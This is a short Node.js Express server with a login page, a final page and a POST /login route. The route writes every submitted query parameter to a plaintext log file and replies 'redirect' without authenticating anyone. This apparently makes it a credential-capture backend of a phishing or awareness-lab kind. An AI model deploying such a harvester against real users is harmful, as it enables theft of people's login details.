const express = require('express');
const app = express();
const port = 3000;
const path = require('path');
const fs = require('fs');

app.use(express.static(__dirname + '/public'))

app.get('/', (req,res) => {
	console.log("root");
	res.send('Got a GET request');
});

app.get('/loginpage', (req, res) => {
	res.sendFile(path.join(__dirname, '/login.html'));
});

app.get('/final', (req, res) => {
	res.sendFile(path.join(__dirname, '/final.html'));
});

app.post('/login', (req, res) => {
	var params = req.query;
	console.log("query:");
	console.log(params);
	console.log("\n");
	fs.appendFileSync("postparameters.log", JSON.stringify(params));
	res.send('redirect');
});

app.get('/notfound', (req, res) => {
	res.send("try again later...");
});

app.listen(port, () => {
	console.log(`Example app listening on port ${port}`);
});
